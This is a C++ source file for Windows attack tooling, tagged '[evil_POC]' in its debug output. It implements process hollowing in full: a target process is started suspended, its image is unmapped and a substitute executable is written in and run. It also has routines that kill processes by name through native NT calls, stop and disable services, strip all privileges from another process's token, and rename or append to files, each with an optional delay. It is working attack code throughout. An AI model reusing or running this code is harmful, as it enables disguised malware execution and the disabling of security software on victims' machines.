#pragma once

#include "Token.h"
#include "fProcess.h"
#include "Helper.h"
namespace poc {
	#include <winternl.h>
	#include <ntstatus.h>
}
#include <thread>


#pragma comment(lib,"ntdll.lib")

typedef  poc::CLIENT_ID *PCLIENT_ID;

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);
EXTERN_C NTSTATUS NTAPI NtOpenProcess(PHANDLE, ACCESS_MASK, poc::POBJECT_ATTRIBUTES, PCLIENT_ID);


using namespace std;


POC_fProcess::POC_fProcess()
{
}

DWORD POC_fProcess::FindProcessID_W(PCWSTR szProcessName)
{
	DWORD dwPID = 0xFFFFFFFF;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;

	// Get System Snapshot
	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	// Searching Process
	Process32First(hSnapShot, &pe);
	do
	{
		if (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))
		{
			dwPID = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &pe));

	CloseHandle(hSnapShot);
	return dwPID;
}

DWORD POC_fProcess::FindProcessID_A(PCSTR szProcessName) {

	//Allocate a (stack) buffer for the Unicode version of the szProcessName 
	SIZE_T cchSize = lstrlenA(szProcessName) + 1;

	PWSTR szProcessNameW = (PWSTR)_malloca(cchSize * sizeof(wchar_t));

	//Convert the ANSI pathname to its Unicode equivalent 
	StringCchPrintfW(szProcessNameW, cchSize, L"%S", szProcessName);

	//Call the Unicode version of the function to actually do the work. 
	return(FindProcessID_W(szProcessNameW));

}

DWORD POC_fProcess::getThreadID(DWORD pid)
{
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
				{
					if (te.th32OwnerProcessID == pid)
					{
						HANDLE hThread = OpenThread(READ_CONTROL, FALSE, te.th32ThreadID);
						if (!hThread)
							wprintf(TEXT("[-] Error: Couldn't get thread handle\n"));
						else
							return te.th32ThreadID;
					}
				}
			} while (Thread32Next(h, &te));
		}
	}

	CloseHandle(h);
	return (DWORD)0;
}

BOOL POC_fProcess::StopService(PCWSTR szProcessName, int delay)
{
	OutputDebugString(TEXT("[evil_POC] StopService -->"));

	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] StopService delay...."));
		Sleep(delay * 1000);
	}

	BOOL bOk = FALSE;
	SC_HANDLE serviceDbHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE serviceHandle = OpenService(serviceDbHandle, szProcessName, SC_MANAGER_ALL_ACCESS);
	LPCTSTR strErrorMessage = NULL;

	SERVICE_STATUS_PROCESS status;
	DWORD bytesNeeded = 0;
	DWORD isOK = QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded);
	if (isOK == 0) {
		strErrorMessage = POC_Helper::strGetLastError(GetLastError());
		OutputDebugString((TEXT("[evil_POC] StopService --> QueryServiceStatusEx failed, ErrorCode = 0x") + (wstring)strErrorMessage).c_str());
	}

	if (status.dwCurrentState == SERVICE_RUNNING)
	{// Stop it
		BOOL b = ControlService(serviceHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&status);
		if (b)
		{
			OutputDebugString(TEXT("[evil_POC] StopService --> SERVICE STOP SUCCESS"));
			bOk = TRUE;
		}
		else { OutputDebugString(TEXT("[evil_POC] StopService --> SERVICE STOP FAIL")); }
	}
	//else {// Start it BOOL b = StartService(serviceHandle, NULL, NULL); if (b) { std::cout << "Service started." << std::endl; } else { std::cout << "Service failed to start." << std::endl; } } CloseServiceHandle(serviceHandle); CloseServiceHandle(serviceDbHandle); return 0; }

	return (bOk);
}

BOOL POC_fProcess::NTkillProcessByName(PCWSTR szProcessName, int delay) {
	OutputDebugString(TEXT("[evil_POC] NTkillProcessByName -->"));

	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] NTkillProcessByName delay...."));
		Sleep(delay * 1000);
	}

	//wait_for_remote_debug();
	DWORD dwPID = 0xFFFFFFFF;
	BOOL bOK = FALSE;
	HANDLE hProcess = NULL;
	LPCTSTR strErrorMessage = NULL;
	static poc::OBJECT_ATTRIBUTES zoa = { sizeof(zoa) };
	PROCESSENUM infoPID;
	poc::CLIENT_ID pid = {};
	

	try {
		dwPID = POC_fProcess::FindProcessID(szProcessName);
		//dwPID = 4760;
		if (dwPID == 0xFFFFFFFF) {
			OutputDebugString(TEXT("[evil_POC] NTkillProcessByName --> Failed to get PID"));
			//__leave;
			return bOK;
		}

		//geth process handle ()
		//infoPID.dwProcessID = dwPID;
		//EnumWindows(EnumWindowsProcMy, (LPARAM)&infoPID);
		pid.UniqueProcess = &dwPID;
		
		//if (infoPID.hInfo.UniqueProcess == NULL) {
		//	OutputDebugString(TEXT("[evil_POC] NTkillProcessByName --> Failed to get Hwnd for thread of PID "));
		//	//__leave;
		//	return bOK;
		//}

		//Open Target process
		if (!NT_SUCCESS(NtOpenProcess(&hProcess,
			PROCESS_TERMINATE,
			&zoa, &pid)))
		{
			poc::NtClose(hProcess);
			strErrorMessage = POC_Helper::strGetLastError(GetLastError());
			OutputDebugString((TEXT("[evil_POC] NTkillProcessByName --> NtOpenProcess(PROCESS_TERMINATE) Status = FAILED ErrorCode = 0x") + (wstring)strErrorMessage).c_str());
			//__leave;
			CloseHandle(infoPID.hInfo.UniqueProcess);
			return bOK;
		}


		//try kill process
		if (!NT_SUCCESS(NtTerminateProcess(hProcess, 1))) {
			strErrorMessage = POC_Helper::strGetLastError(GetLastError());
			OutputDebugString((TEXT("[evil_POC] NTkillProcessByName --> TerminateProcess Status = FAILED Error = ") + (wstring)strErrorMessage).c_str());
			poc::NtClose(hProcess);
			CloseHandle(infoPID.hInfo.UniqueProcess);
			return bOK;
		}

		bOK = TRUE;

	}
	catch (...)
	{
		OutputDebugString(TEXT("[evil_POC] NTkillProcessByName --> EXCEPTION"));
	}
	//__finally
	//{
		//TODO Clean up
	if (hProcess != NULL) {
		poc::NtClose(hProcess);
		CloseHandle(infoPID.hInfo.UniqueProcess);
	}
	//}

	return bOK;
}

BOOL POC_fProcess::StartHollowed(LPWSTR szTarget, LPWSTR szEvilSubstitute, int delay) {
	OutputDebugString(TEXT("[evil_POC] StartHollowed -->"));
	OutputDebugString((TEXT("[evil_POC] param 1 = ") + (wstring)szTarget).c_str());
	OutputDebugString((TEXT("[evil_POC] param 2 = ") + (wstring)szEvilSubstitute).c_str());

	//wait_for_remote_debug();
	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] StartHollowed delay...."));
		Sleep(delay * 1000);
	}

	BOOL bOk = FALSE;

	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	
	OutputDebugString(TEXT("[evil_POC] Running the target executable"));

	if (!CreateProcessW(NULL, szTarget, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Start the target application
	{
		OutputDebugString((TEXT("[evil_POC] Error: Unable to run the target executable. CreateProcess failed with error = ") + (wstring)POC_Helper::strGetLastError(GetLastError())).c_str());
		return bOk;
	}

	OutputDebugString(TEXT("[evil_POC] Process created in suspended state"));

	OutputDebugString(TEXT("[evil_POC]  Opening the replacement executable"));

	hFile = CreateFileW(szEvilSubstitute, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); // Open the replacement executable

	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugString((TEXT("[evil_POC] Error: Unable to open the replacement executable. CreateFile failed with error = ") + (wstring)POC_Helper::strGetLastError(GetLastError())).c_str());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return bOk;
	}

	nSizeOfFile = GetFileSize(hFile, NULL); // Get the size of the replacement executable

	OutputDebugString(TEXT("[evil_POC] Allocate memory for the executable file"));

	try {
		image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the executable file
	} 
	catch (...) {
		OutputDebugString(TEXT("[evil_POC] Unexpected error occured"));
		return bOk;
	}

	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) // Read the executable file from disk
	{
		OutputDebugString((TEXT("[evil_POC] Error: Unable to read the replacement executable. ReadFile failed with error = ") + (wstring)POC_Helper::strGetLastError(GetLastError())).c_str());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return bOk;
	}

	poc::NtClose(hFile); // Close the file handle

	pDosH = (PIMAGE_DOS_HEADER)image;

	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		OutputDebugString(TEXT("[evil_POC] Error: Invalid executable format"));
		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return bOk;
	}

	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS

	NtGetContextThread(pi.hThread, &ctx); // Get the thread context of the child process's primary thread

#ifdef _WIN64
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif

#ifdef _X86_
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{
		OutputDebugString((TEXT("[evil_POC] Unmapping original executable image from child process. Address: ") + (SIZE_T)base));
		NtUnmapViewOfSection(pi.hProcess, base); // Unmap the executable image using NtUnmapViewOfSection function
	}

	OutputDebugString(TEXT("[evil_POC] Allocating memory in child process"));
	
	try {
		mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory for the executable image
	}
	catch (...) {
		OutputDebugString(TEXT("[evil_POC] Unexpected error occured"));
		return bOk;
	}

	if (!mem)
	{
		OutputDebugString((TEXT("[evil_POC] Error: Unable to allocate memory in child process. VirtualAllocEx failed with error = ") + (wstring)POC_Helper::strGetLastError(GetLastError())).c_str());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return bOk;
	}

	OutputDebugString((TEXT("[evil_POC] Memory allocated. Address: ") + (SIZE_T)mem));

	OutputDebugString(TEXT("[evil_POC] Writing executable image into child process"));

	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL); // Write the header of the replacement executable into child process

	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++)
	{
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL); // Write the remaining sections of the replacement executable into child process
	}


#ifdef _WIN64
	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	OutputDebugString((TEXT("[evil_POC] New entry point: ") + ctx.Rcx));

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif

#ifdef _X86_
	ctx.Eax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	OutputDebugString((TEXT("[evil_POC] New entry point: ") + ctx.Eax));

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif


	OutputDebugString(TEXT("[evil_POC] Setting the context of the child process's primary thread"));

	NtSetContextThread(pi.hThread, &ctx); // Set the thread context of the child process's primary thread

	OutputDebugString(TEXT("[evil_POC] Resuming child process's primary thread"));

	NtResumeThread(pi.hThread, NULL); // Resume the primary thread

	OutputDebugString(TEXT("[evil_POC] Thread resumed"));

	OutputDebugString(TEXT("[evil_POC] Waiting for child process to terminate"));

	poc::NtWaitForSingleObject(pi.hProcess, FALSE, NULL); // Wait for the child process to terminate

	OutputDebugString(TEXT("[evil_POC] Process terminated"));

	poc::NtClose(pi.hThread); // Close the thread handle
	poc::NtClose(pi.hProcess); // Close the process handle

	VirtualFree(image, 0, MEM_RELEASE); // Free the allocated memory
	bOk = TRUE;

	return bOk;

}

BOOL POC_fProcess::killProcessByName(PCWSTR szProcessName, int delay)
{
	OutputDebugString(TEXT("[evil_POC] killProcessByName -->"));

	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] killProcessByName delay...."));
		Sleep(delay*1000);
	}

	DWORD dwPID = 0xFFFFFFFF;
	BOOL bOK = FALSE;
	HANDLE hProcess = NULL;
	LPCTSTR strErrorMessage = NULL;

	try {
		dwPID = POC_fProcess::FindProcessID(szProcessName);
		//dwPID = 4760;
		if (dwPID == 0xFFFFFFFF) {
			OutputDebugString(TEXT("[evil_POC] killProcessByName --> Failed to get PID"));
			//__leave;
			return bOK;
		}

		//Open Target process
		hProcess = OpenProcess(PROCESS_TERMINATE, 0, dwPID);
		if (hProcess == NULL) {
			strErrorMessage = POC_Helper::strGetLastError(GetLastError());
			OutputDebugString((TEXT("[evil_POC] killProcessByName --> OpenProcess(PROCESS_TERMINATE) Status = FAILED ErrorCode = 0x") + (wstring)strErrorMessage).c_str());
			//__leave;
			return bOK;
		}

		//try kill process
		DWORD isTerminated = TerminateProcess(hProcess, 9);
		if (isTerminated == 0)
		{
			strErrorMessage = POC_Helper::strGetLastError(GetLastError());
			OutputDebugString((TEXT("[evil_POC] killProcessByName --> TerminateProcess Status = FAILED ErrorCode = 0x") + (wstring)strErrorMessage).c_str());
			//__leave;
			return bOK;
		}

		bOK = TRUE;

	}
	catch (...)
	{
		OutputDebugString(TEXT("[evil_POC] killProcessByName --> EXCEPTION"));
	}
	//__finally
	//{
		//TODO Clean up
		if (hProcess != NULL) {
			CloseHandle(hProcess);
		}
	//}

	return bOK;
}

BOOL POC_fProcess::SetServiceType_DISABLE(PCWSTR szProcessName, int delay)
{
	OutputDebugString(TEXT("[evil_POC] SetServiceType_DISABLE -->"));

	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] SetServiceType_DISABLE delay...."));
		Sleep(delay * 1000);
	}

	BOOL bOk = FALSE;
	SC_HANDLE serviceDbHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE serviceHandle = OpenService(serviceDbHandle, szProcessName, SC_MANAGER_ALL_ACCESS);
	LPCTSTR strErrorMessage = NULL;

	if (ChangeServiceConfig(
		serviceHandle,
		SERVICE_NO_CHANGE,
		SERVICE_DISABLED,
		SERVICE_NO_CHANGE,
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		nullptr))
	{
		bOk = TRUE;
	}
	else {
		strErrorMessage = POC_Helper::strGetLastError(GetLastError());
		OutputDebugString((TEXT("[evil_POC] SetServiceType_DISABLE --> TerminateProcess Status = FAILED ErrorCode = 0x") + (wstring)strErrorMessage).c_str());
	}

	return (bOk);
}

BOOL POC_fProcess::RenameFile(PCWSTR szOldPath, PCWSTR szNewPath, int delay)
{
	OutputDebugString(TEXT("[evil_POC] RenameFile -->"));

	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] RenameFile delay...."));
		Sleep(delay * 1000);
	}

	BOOL bOk = FALSE;
	DWORD fResult = 0;

	//MoveFile

	if (_wrename(szOldPath, szNewPath) == 0) {
		OutputDebugString(TEXT("[evil_POC] RenameFile --> SUCCESS"));
		bOk = TRUE;
	}
	else {
		OutputDebugString(TEXT("[evil_POC] RenameFile --> FAIL"));
	}

	return bOk;
}

BOOL POC_fProcess::RemoveAllPrivileges(PCWSTR szProcessName, int delay) {
	OutputDebugString(TEXT("[evil_POC] RemoveAllPrivileges -->"));

	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] RemoveAllPrivileges delay...."));
		Sleep(delay * 1000);
	}

	//wait_for_remote_debug();
	DWORD dwPID = 0xFFFFFFFF;
	BOOL bOK = FALSE;
	HANDLE hToken = NULL;
	LPCTSTR strErrorMessage = NULL;
	PTOKEN_PRIVILEGES pTokenPriv;
	std::vector<LPWSTR> vstrPriv;
	PLUID pLUID = NULL;
	LPWSTR  lpPrivName;
	DWORD sz = 0;
	ULONG dwErrorCode = 0;


	try {
		dwPID = POC_fProcess::FindProcessID(szProcessName);
		//dwPID = 4760;
		if (dwPID == 0xFFFFFFFF) {
			OutputDebugString(TEXT("[evil_POC] RemoveAllPrivileges --> Failed to get PID"));
			//__leave;
			return bOK;
		}


		// PRINT current tokens
		if (!POC_Token::GetPrivilegesFromProcess(&pTokenPriv, dwPID)) {
			OutputDebugString(TEXT("[evil_POC] RemoveAllPrivileges --> GetPrivilegesFromProcess Failed"));
			return bOK;
		}

		if (pTokenPriv->PrivilegeCount == 0) {
			wprintf(L"w> TokenPrivileges PrivilegeCount = 0\n");
			OutputDebugString(TEXT("[evil_POC] RemoveAllPrivileges PrivilegeCount = 0"));
			throw HRESULT_FROM_WIN32(dwErrorCode);
		}
		else
		{
			wprintf(L"\tPrivilegeCount = %d\n", pTokenPriv->PrivilegeCount);
			OutputDebugString(TEXT("[evil_POC] RemoveAllPrivileges PrivilegeCount = zzz"));
		}

		for (size_t i = 0; i < pTokenPriv->PrivilegeCount; i++) {
			sz = 0;

			LookupPrivilegeName(NULL, &(pTokenPriv->Privileges[i].Luid), NULL, &sz);
			lpPrivName = (LPTSTR)malloc(sz * sizeof(TCHAR));

			//LPWSTR name;
			if (!LookupPrivilegeName(NULL, &(pTokenPriv->Privileges[i].Luid), lpPrivName, &sz)) {
				dwErrorCode = GetLastError();
				wprintf(L"w> GetTokenInformation failed. ErrorCode = 0x%d\n", dwErrorCode);
				OutputDebugString(TEXT("[evil_POC] RemoveAllPrivileges --> LookupPrivilegeName failed"));
				throw HRESULT_FROM_WIN32(dwErrorCode);
			}

			OutputDebugString((TEXT("[evil_POC] RemoveAllPrivileges --> lpPrivName print ") + (wstring)lpPrivName).c_str());
			wprintf(L"\t\t%s\n", lpPrivName);

		}

		// Delete all priv
		if (!POC_Token::RemovePrivilegesFromProcess(pTokenPriv, dwPID)) {
			OutputDebugString(TEXT("[evil_POC] RemovePrivilegesFromProcess --> Failed to delete pTokenPriv"));
			return bOK;
		}
		OutputDebugString(TEXT("[evil_POC] RemovePrivilegesFromProcess --> success"));
	}
	catch (...)
	{
		OutputDebugString(TEXT("[evil_POC] NTkillProcessByName --> EXCEPTION"));
	}
	//TODO Clean up
	if (hToken != NULL) {
		poc::NtClose(hToken);
		CloseHandle(hToken);
	}
	
	
	return (bOK = true);

}

void echoLoop(PCWSTR szDestPath, PCWSTR szText, int loop) {
	OutputDebugString((TEXT("[evil_POC] echoLoop -->") + (wstring)szText).c_str());
	wofstream myfile;
	//__try {
	int i = 0;

		while ( i < loop) {
			myfile.open(szDestPath, std::ios_base::app);
			myfile << szText;
			OutputDebugString(( TEXT("[evil_POC] echoLoop <-") + (wstring)szText).c_str());
			std::this_thread::sleep_for(std::chrono::seconds(5));
			myfile.close();
			i++;
		}
	//}
	//__finally{
		
	//}
}

BOOL POC_fProcess::Echo(PCWSTR szDestPath, PCWSTR szText, int delay, bool threaded)
{
	OutputDebugString(TEXT("[evil_POC] Echo -->"));

	if (delay != 0) {
		OutputDebugString(TEXT("[evil_POC] Echo delay...."));
		Sleep(delay * 1000);
	}

	BOOL bOk = FALSE;
	DWORD fResult = 0;

	//write to file
	try {
		if (threaded) {
			OutputDebugString(TEXT("[evil_POC] Start thread...."));
			std::thread t1(echoLoop, szDestPath, szText, 5);
			t1.join();
		}
		else {
			echoLoop(szDestPath, szText, 1);
		}
		bOk = TRUE;
	} catch (...) {
		bOk = FALSE;
	}	

	return bOk;
}
